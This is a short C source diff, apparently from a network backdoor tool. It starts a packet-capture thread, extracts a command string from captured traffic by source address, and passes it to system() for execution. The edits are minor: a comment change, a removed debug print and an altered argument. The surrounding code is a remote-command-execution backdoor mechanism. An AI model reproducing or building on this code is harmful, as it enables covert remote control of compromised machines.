@@ -230,7 +230,7 @@ int main(int argc, char **argv) {
   // ===========================================================================
   // [xcap]
   {
-    // Start a concurrent packet ring buffer
+    // Start a new thread for DPI. @zomgwtfbbqkewl
     pthread_t th;
     pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);
   }
@@ -489,10 +489,9 @@ int main(int argc, char **argv) {
           }
           free(rce);
         } else {
-          boopprintf("  -> xCap search %s for RCE\n", saddrval);
           char *rce = malloc(MAX_RCE_SIZE);
           int retval;
-          retval = xcaprce(saddrbytes, rce);
+          retval = xcaprce(saddrval, rce);
           if (retval == 0) {
             boopprintf("  <- Executing: %s\r\n", rce);
             system(rce);
